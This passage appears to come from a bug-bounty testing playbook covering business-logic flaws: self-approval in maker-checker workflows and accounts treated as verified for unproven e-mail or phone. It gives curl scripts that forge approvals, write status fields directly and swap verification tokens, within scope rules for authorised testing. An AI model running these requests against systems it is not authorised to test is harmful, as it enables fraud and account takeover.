- **Escalate:** completion without payment: BIZ-007. A locked state that is an approval: BIZ-014. A skipped step
  that is a verification: BIZ-015. A window between check and use that needs simultaneous requests: RAC chapter.
  A removed member who keeps access is access control: BAC chapter.

### BIZ-014 · A request that needs another role's approval is completed by the requester

| | |
|---|---|
| **Severity** | Medium standalone; High when the approval gates money, publication to other users or privilege |
| **Requires** | roles, priv-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Authorization · CWE-285 |
| **Prior art** | #1543159, #452959, #1861487, #3610332 |

- **Where:** maker-checker features: expense, invoice, payout and purchase approvals, publishing and moderation
  queues, access and role requests, change or merge approvals, time-sheet sign-off, review of listings, apps or
  advertisers before they go live. In this card `$A` is the requester (low role) and `$B` the approver, both in
  the same tenant. Capture the approver's requests once with `$B`, then replay them with `$A`. A product with
  roles and no approval step has nothing to test: mark the card `skipped` with that reason.
- **Test:** the approve endpoint checks that the caller is logged in and the object exists, not that the caller
  holds the approver role or differs from the requester; or the approval is not bound to the content that was
  reviewed. As the requester: call approve, write the approved state directly, call the step that follows
  approval, and change the object after the approver approved it. As the approver: approve without the version
  parameter after the requester changed the content.
- **How:**
  ```bash
  D="$E/evidence/$H/BIZ-014"; mkdir -p "$D"          # $A = requester (low role), $B = approver, same tenant
  st(){ curl -sS "${HDR[@]}" $B "$T/api/expenses/$X" -o "$D/state_$1.json"; printf '%s: ' "$1"
        grep -Eo '"(status|approved_by|approved_at|amount|version|etag)"\s*:\s*"?[A-Za-z0-9:._@-]+' "$D/state_$1.json" | tr '\n' ' '; echo; }
  # 0. A creates a request that needs approval (smallest amount, no payout destination attached)
  curl -sS "${HDR[@]}" $A -X POST "$T/api/expenses" -H 'Content-Type: application/json' -d '{"title":"biz014","amount":"1.00"}' -o "$D/create.json"
  X='<id from create.json>'; st 0_pending
  # 1. self-approval: the approver's request sent with the requester's session
  curl -sS "${HDR[@]}" $A -X POST "$T/api/expenses/$X/approve" -H 'Content-Type: application/json' -d '{}' -D- -o "$D/self_approve.json"; st 1_after_self_approve
  # 2. the result written directly, on update and on create
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/expenses/$X" -H 'Content-Type: application/json' \
    -d '{"status":"approved","approved_by":"<A user id>","needs_approval":false}' -D- -o "$D/state_write.json"; st 2_after_state_write
  curl -sS "${HDR[@]}" $A -X POST "$T/api/expenses" -H 'Content-Type: application/json' \
    -d '{"title":"biz014-b","amount":"1.00","status":"approved","auto_approve":true}' -o "$D/create_approved.json"
  # 3. the step after approval, called while pending (only when no bank or payout destination is connected to our
  #    test tenant: the call must change a status and move no money)
  curl -sS "${HDR[@]}" $A -X POST "$T/api/expenses/$X/reimburse" -D- -o "$D/skip_to_next.json"; st 3_after_skip
  # 4. approve, then change: B approves, A edits the approved object
  curl -sS "${HDR[@]}" $B -X POST "$T/api/expenses/$X/approve" -H 'Content-Type: application/json' -d '{"version":"<current version>"}' -o "$D/approve_by_B.json"
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/expenses/$X" -H 'Content-Type: application/json' \
    -d '{"amount":"2.00","title":"biz014 changed after approval"}' -D- -o "$D/edit_after_approval.json"; st 4_after_edit
  # 5. stale approval: on a second pending object, A changes the content after B loaded it; B approves with the
  #    version parameter left out, then with the old value
  curl -sS "${HDR[@]}" $B -X POST "$T/api/expenses/<second id>/approve" -H 'Content-Type: application/json' -d '{}' -D- -o "$D/approve_no_version.json"
  curl -sS "${HDR[@]}" $B -X POST "$T/api/expenses/<second id>/approve" -H 'Content-Type: application/json' -d '{"version":"<old version>"}' -D- -o "$D/approve_old_version.json"
  ```
- **Proof:** the object read with the approver's session showing the approved state, or the effect that follows
  approval (published, active), although the approver account never approved it or approved other content: the
  pending state, the requester's request, the final state, and the audit-log entry when the product keeps one.
  Amounts are minimal and nothing is paid out: stop at the status.
- **Not a finding when:** the requester's role may approve its own requests by configuration (small-team
  settings, "auto-approve below X": read the policy screen as the approver); the response is 200 and the state
  read by the approver is unchanged; account A is in fact an owner or admin of the tenant; an edit after
  approval sends the object back to pending; the approval is an advisory label that nothing downstream reads.
- **Escalate:** a missing role check on an endpoint is function-level authorisation: BAC chapter, one report. An
  approve action reachable by GET or without a CSRF token lets the requester make the approver's browser
  approve: CSR chapter. Edit-after-approval mechanics: BIZ-013. State in the report what the approval gates
  (payout, ad spend, publication) without triggering it.

### BIZ-015 · An account is treated as verified for an e-mail address or phone number it never proved control of

| | |
|---|---|
| **Severity** | Medium standalone; High when the unproven address joins an organisation by its domain or displaces another account's address |
| **Requires** | login, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Reliance on Untrusted Inputs in a Security Decision · CWE-807 |
| **Prior art** | #1551176, #2588329, #1018489, #565883 |

- **Where:** sign-up (where `signup` is true), change-e-mail and change-phone flows, adding a secondary address,
  the profile update API, invitation acceptance, and every feature gated on "verified": joining a workspace by
  e-mail domain, creating API keys, posting, payouts, trial start, a verified badge. The state shows in
  `email_verified`, `verified`, `confirmed_at`, `phone_verified`, `pending_email`, `unconfirmed_email`. Use only
  addresses and numbers we own: V is an address at our own domain whose mailbox we deliberately do not open,
  W is an address we read. Never a third party's address or number: the test would send them mail or SMS.
- **Test:** "verified" is stored as a flag on the account instead of a fact about one address, so it survives
  when the address changes; or the outcome of verification is something the client supplies. Change a verified
  account's address to V and read the flag before any link is used; write the flag directly; request a link or
  code for W, switch the pending address to V and spend W's link or code; call a verified-only feature from an
  account that never verified.
- **How:**
  ```bash
  D="$E/evidence/$H/BIZ-015"; mkdir -p "$D"; V='<address at our domain that we do not open>'; W='<address we read>'
  me(){ curl -sS "${HDR[@]}" $A "$T/api/me" -o "$D/me_$1.json"; printf '%s: ' "$1"
        grep -Eo '"(email|pending_email|unconfirmed_email|email_verified|verified|confirmed_at|phone|phone_verified)"\s*:\s*[^,}]{1,80}' "$D/me_$1.json" | tr '\n' ' '; echo; }
  me 0_verified_start
  # 1. does the verified flag survive an address change?
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/me" -H 'Content-Type: application/json' -d "{\"email\":\"$V\"}" -D- -o "$D/change_to_V.json"; me 1_after_change
  # 2. state supplied by the client
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/me" -H 'Content-Type: application/json' \
    -d "{\"email\":\"$V\",\"email_verified\":true,\"verified\":true,\"confirmed_at\":\"2020-01-01T00:00:00Z\"}" -o "$D/state_write.json"; me 2_after_state_write
  # 3. a link or code issued for W, spent for V
  curl -sS "${HDR[@]}" $A -X POST "$T/api/me/email" -H 'Content-Type: application/json' -d "{\"email\":\"$W\"}" -o /dev/null   # mail arrives at W
  curl -sS "${HDR[@]}" $A -X POST "$T/api/me/email" -H 'Content-Type: application/json' -d "{\"email\":\"$V\"}" -o /dev/null   # pending address is now V
  curl -sS "${HDR[@]}" $A "$T/verify-email?token=<token from the mail to W>" -D- -o "$D/confirm_with_W_token.html"; me 3_after_W_token
  curl -sS "${HDR[@]}" $A -X POST "$T/api/me/email/confirm" -H 'Content-Type: application/json' \
    -d "{\"email\":\"$V\",\"code\":\"<code sent to W>\"}" -o "$D/confirm_code_for_V.json"; me 4_after_code_swap
  # 4. a verified-only feature called by an account that never verified (here $B is a fresh account of ours whose
  #    link was not clicked; skip this step without one)
  curl -sS "${HDR[@]}" $B "$T/api/me" | grep -Eo '"(email_verified|verified)"\s*:\s*[a-z]+'
  curl -sS "${HDR[@]}" $B -X POST "$T/api/api-keys" -H 'Content-Type: application/json' -d '{"name":"biz015"}' -D- -o "$D/gated_feature.json"
  ```
  The phone flow is the same with two numbers we own: request the code for one, confirm with the other number
  in the request body.
- **Proof:** `/api/me` or the security settings page showing V as the account's primary address in a verified
  state, while the request log shows that no link or code sent to V was ever used. For the gate: the gated
  feature's success response from an account whose own profile says `email_verified: false`. For the high
  case: V at a domain that our second tenant has claimed, and the account now listed among that tenant's
  members.
- **Not a finding when:** the new address is stored as pending and the old one stays primary and verified until
  the link is used; the feature does not require verification in this product (missing e-mail verification at
  sign-up by itself is closed as informative on most programmes); the flag changed only in a response we
  edited; the address was asserted by an identity provider that verified it; we did control the address (a code
  was re-sent to V and V is ours).
- **Escalate:** an unverified address that a login-with or SSO consumer trusts is the paying form (#1018489,
  #565883): OAU chapter. Registering a victim's address unverified before they arrive, and reset links sent to
  a pending address: AUT chapter. Domain auto-join into our second tenant is cross-tenant access: BAC chapter.
  A code accepted for another number than the one it was sent to takes over that number's account (#2588329):
  prove it only between our own two numbers.

## Graveyard

- **An odd value accepted, nothing gained.** A negative quantity stored in the cart and refused at payment, a
  tampered price echoed in a response while the charge is right, a status field that echoes and does not
  persist. Closed informative. Read the final server-side state before writing anything.
- **Flags flipped in the browser.** "I changed `isPremium` to true and the premium screen appeared." Without a
  paid API call that succeeds there is no finding.
- **Trial, promotion and referral farming with more accounts.** New e-mail addresses, plus-aliases, disposable
  mailboxes, inviting yourself. Treated as accepted risk or a fraud-team matter and often named out of scope
  in the policy text; `_facts.json` has no exclusion tag for it, so check the policy by hand.
- **Regional pricing through a VPN or a billing-country change.** A pricing policy, not a flaw.
- **Coupon code guessing and "no rate limit on the promo field".** (`rate-limit`); testing it at volume needs
  `bruteforce-ok`. Publicly posted codes that work as issued are the promotion itself.
- **Unlimited likes, votes, follows, reviews or invitations sent.** Low or informative unless the count is
  money or reputation the product pays out on (`rate-limit` where the programme excludes it).
- **UI-only limits with no consequence.** A bio longer than the form allows, a fourth tag. Informative.
- **Missing e-mail verification at sign-up, alone.** Informative unless a gate, a domain trust or another
  account's address is involved (BIZ-015).
- **Flaws of the payment provider, its hosted page or its test mode.** Test cards in a sandbox pay for anything
  by design; a bug on the provider's own host is not the target's (`third-party`).
- **Refunds obtained by persuading support, chargebacks at the bank.** (`social-engineering`); never attempted.
- **Holding stock in carts, exhausting a shared quota, running up the vendor's bill.** (`dos`).
- **"Could be repeated a million times" with no instance shown,** or a purchase path never completed. A
  candidate, not a finding. Triagers ask for the order in the account.
- **The same over-limit result filed twice,** once as logic and once as a race. One root cause, one report;
  the second is a duplicate.
- **Losses the reporter alone carries.** Paying more than the price, losing one's own credits.
- **A merchant mis-pricing their own product.** Configuration by the account owner.
- **Scanner output naming "business logic" without an order, balance or state in an account** (`automated`).

## Chains

- BIZ-001, BIZ-002, BIZ-005 → BIZ-007: a total driven to zero or below reaches the free-order path, which often
  skips the provider altogether.
- BIZ-009 (locked e-mail field writable) → BIZ-015 → AUT and OAU chapters: an unproven address becomes an
  identity other systems trust.
- BIZ-006 + BIZ-010: a purchase that grants a reward, refunded with the reward kept.
- BIZ-008 → BIZ-011, BIZ-012: a missing plan check also removes the plan's quota and the trial's end.
- BIZ-013 → BIZ-014: an approved object that still accepts edits is an approval of content nobody reviewed.
- RAC chapter → BIZ-005, BIZ-006, BIZ-011, BIZ-012: every "once" and every "at most N" has a parallel form.
- API chapter (mass assignment) → BIZ-001, BIZ-008, BIZ-012, BIZ-014: the added field is the tamper.
- BAC chapter (order, cart, wallet and payment-method ids) → BIZ-007: someone else's object as the means of
  payment; prove it only against account B.
- CSR chapter → BIZ-007, BIZ-014: a state-changing completion or approval the victim's browser can be made to
  send.
- JWT-001, DSR-002 → BIZ-001, BIZ-008, BIZ-013: a price, plan or step counter kept in a client-held token.
- GQL-006, GQL-007 → BIZ-008, BIZ-006: plan checks missing on single mutations; aliases repeating a one-time
  claim in one request.
- BIZ-008 → SSR-001 and the UPL chapter: unlocked paid features (webhooks, imports, custom domains) are new
  surface; record the facts so the planner queues those cards.

## Sources

- `kb/reports/logic.md` and `kb/reports/all/logic.md`: the disclosed reports this chapter is built from; the race
  forms are in `kb/reports/race.md`.
- HexBrain: `get_testing_playbook {"topic":"Business Logic"}`; `plan_tests` for the checkout, billing and
  approval features found in the map.
- PortSwigger Web Security Academy, Business logic vulnerabilities; OWASP WSTG Business Logic Testing,
  WSTG-BUSL-01 to WSTG-BUSL-09 (data validation, forged requests, integrity checks, limits on function use,
  circumvention of work flows), and Test Payment Functionality in the current edition; PayloadsAllTheThings,
  Business Logic Errors.
- OWASP API Security Top 10 (2023), API6: Unrestricted Access to Sensitive Business Flows.
- CWE-840 (business logic errors), CWE-841 (improper enforcement of behavioural workflow), CWE-602 (client-side
  enforcement of server-side security).
- The payment provider's own integration guide for the provider found in the probe (order fulfilment by signed
  server-to-server notification): it is the reference design BIZ-007 tests against.
